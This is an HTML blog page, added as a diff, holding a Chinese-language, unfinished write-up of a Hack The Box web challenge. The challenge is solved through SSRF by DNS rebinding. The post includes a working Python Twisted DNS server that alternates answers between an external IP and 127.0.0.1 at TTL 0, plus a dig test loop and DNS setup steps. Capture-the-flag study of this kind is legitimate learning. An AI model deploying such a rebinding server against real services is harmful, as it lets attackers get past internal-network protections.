@@ -1,0 +1,269 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>[HTB]一道涉及DNS Rebinding attack的题(未做出来) | 持剑</title>
+<meta name="description" content="碎月星辰揽江风 , 我心有剑问天涯 ">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://1dayluo.github.io/favicon.ico?v=1711284755357">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://1dayluo.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://1dayluo.github.io">
+        <img class="avatar" src="https://1dayluo.github.io/images/avatar.png?v=1711284755357" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://1dayluo.github.io">
+        <h1 class="site-title">持剑</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+          <h2 class="post-title">[HTB]一道涉及DNS Rebinding attack的题(未做出来)</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2022-01-07</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://1dayluo.github.io/tag/Svnemmt1vn/">
+                    刷题
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://1dayluo.github.io/tag/iAzsp2lm0F/">
+                    HTB
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://1dayluo.github.io/tag/hkZZrvn-OU4/">
+                    web
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content" v-pre>
+            <h1 id="baby-cachedview-没做出来">baby CachedView (没做出来)</h1>
+<p>题目提供的Dockerfile下载cffi的时候报错,需要下载libcairo2-dev gcc<br>
+暂时不打算做了.服务器之前白嫖了一个ipv6的小鸡,但是老实说自己不怎么会玩= =好像连ipv6好只能手机下一个1.1.1.1的vpn.......弄python环境又费好长时间.太费时间了.主要记录一下思路</p>
+<!-- more -->
+<figure data-type="image" tabindex="1"><img src="https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/20220107_1.png" alt="Untitled" loading="lazy"></figure>
+<p>先看一下代码,是有对应的flag路径的,并且是一个flag.png<br>
+仔细观察访问/flag的路由处调用的函数(自定义的装饰器) 会发现有一个or的语法<br>
+<img src="https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/20220107_2.png" alt="Untitled" loading="lazy"><br>
+cache_web 内部有负责检查json传递的url是否是内网的ip.如果是,就会拒绝访问并提示</p>
+<figure data-type="image" tabindex="2"><img src="baby%20CachedView%20(%E6%B2%A1%E5%81%9A%E5%87%BA%E6%9D%A5)%20643fd77ac8bd473b81f7b05c5c8e09fb/Untitled%202.png" alt="Untitled" loading="lazy"></figure>
+<p>看截图的代码(这个写的不错,学习了.之前我也用webdriver写过爬虫,没有想到这个方法)</p>
+<pre><code class="language-php">from selenium.webdriver.support.ui import WebDriverWait
+WebDriverWait(driver, wait_time).until(lambda r: r.execute_script('return document.readyState') == 'complete')
+</code></pre>
+<p>发现即使在api的请求中去掉referrer也会在截图的代码中被识别非本地或有referrer.所以这里要使用一下DNS rebinding的方法(注意 该方法基于TTL为0的基础上,否则会返回缓存即外网地址.ssrf会失败)</p>
+<blockquote>
+<p>Since domain owners have complete control of their DNS records, they can resolve their hostnames to arbitrary IP addresses. The DNS rebinding attack abuses this privilege.</p>
+</blockquote>
+<p>以下截图来自defcon的视频截图</p>
+<figure data-type="image" tabindex="3"><img src="https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/20220107_3.png" alt="Untitled" loading="lazy"></figure>
+<p>最后我按着先知社区的这个帖子学来的知识去实践(谢谢大佬),<a href="https://xz.aliyun.com/t/7495#toc-5">https://xz.aliyun.com/t/7495#toc-5</a> 这篇帖子也没有用 前面两个用到的”<strong>Singularity of Origin DNS Rebinding Attack”</strong> 工具,而是自己写了一个,我觉得对于理解也很有用.我跟着帖子以及google学习了一下twisted涉及DNS请求的部分,里面的twsited的代码应该是参考的twisted 16.5.0的document下howto的</p>
+<p>用了帖子里的代码(改了一点)</p>
+<pre><code class="language-python">from collections import defaultdict
+from twisted.internet import reactor, defer
+from twisted.names import client, dns, error, server
+import logging
+
+RECORD = defaultdict(int)
+SOURCE_IP = &quot;178.128.174.129&quot;
+TARGET_IP = &quot;127.0.0.1&quot;
+KEY_WORD = '2u1e0'
+
+logging.basicConfig(level=logging.INFO,
+                    filename=&quot;{}.log&quot;.format(KEY_WORD),
+                    format='%(asctime)s - %(pathname)s[line:%(lineno)d] - %(levelname)s: %(message)s'
+                    )
+
+class DynamicResolver(object):
+    def _dynamicResponseRequired(self,query):
+        # print(query.name.name)
+        if KEY_WORD in str(query.name.name):
+            return True
+        else:
+            return False 
+
+    def _doDynamicResponse(self, query):
+        name = query.name.name
+        if name not in RECORD or RECORD[name] % 3 == 0:
+            ip = SOURCE_IP
+        else:
+            ip = TARGET_IP
+        RECORD[name] += 1
+        
+        logging.info(&quot;\t[-] {}({}) ===&gt; {}&quot;.format(name,RECORD[name],ip))
+        answer = dns.RRHeader(
+            name = name,
+            type = dns.A,
+            cls = dns.IN,
+            ttl = 0, 
+            payload = dns.Record_A(address=ip,ttl=0)
+        )
+        answers = [answer]
+        authority = []
+        additional = []
+        return answers, authority, additional
+    
+    def query(self,query,timeout=None):
+        if self._dynamicResponseRequired(query):
+            return defer.succeed(self._doDynamicResponse(query))
+        else:
+            
+            return defer.fail(error.DomainError())
+    
+
+def main():
+    factory = server.DNSServerFactory(
+        clients = [DynamicResolver(),client.Resolver(resolv='/etc/resolv.conf')]
+    )
+    protocol = dns.DNSDatagramProtocol(controller=factory)
+    reactor.listenUDP(53,protocol)
+    reactor.run()
+
+if __name__ == '__main__':
+    raise SystemExit(main())
+</code></pre>
+<p>一个shell脚本进行测试:</p>
+<pre><code class="language-sh">#!/bin/sh
+for ((i=0; i&lt;10; i++));
+do
+	dig @8.8.8.8 2u1e0.xyz
+done
+</code></pre>
+<p>还要修改/etc/resolv.conf</p>
+<p>同时,在自己购买的域名(刚买的)上进行配置:</p>
+<figure data-type="image" tabindex="4"><img src="https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/20220107_4.png" alt="Untitled" loading="lazy"></figure>
+<p>但是还需要加一条NS记录,填自己的的DNS服务器域名........</p>
+<h2 id="referer">Referer</h2>
+<ul>
+<li><a href="https://www.youtube.com/watch?v=y9-0lICNjOQ&amp;list=PLB0iNDIOY78Yno8UgY1j_2kKlrTxZticw">https://www.youtube.com/watch?v=y9-0lICNjOQ&amp;list=PLB0iNDIOY78Yno8UgY1j_2kKlrTxZticw</a></li>
+<li><a href="https://xz.aliyun.com/t/7495#toc-5">https://xz.aliyun.com/t/7495#toc-5</a></li>
+<li><a href="https://twistedmatrix.com/documents/16.5.0/names/howto/custom-server.html">https://twistedmatrix.com/documents/16.5.0/names/howto/custom-server.html</a>  学习twsited的时候用到的</li>
+</ul>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://1dayluo.github.io/post/tui-jian-yi-xia-zi-ji-kai-fa-de-lun-tan-dan-han/">
+              <h3 class="post-title">
+                下一篇：推荐一下自己开发的论坛:蛋憨
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan">碎月星辰揽江风 , 我心有剑问天涯 </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+   | <a class="rss" href="https://1dayluo.github.io/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
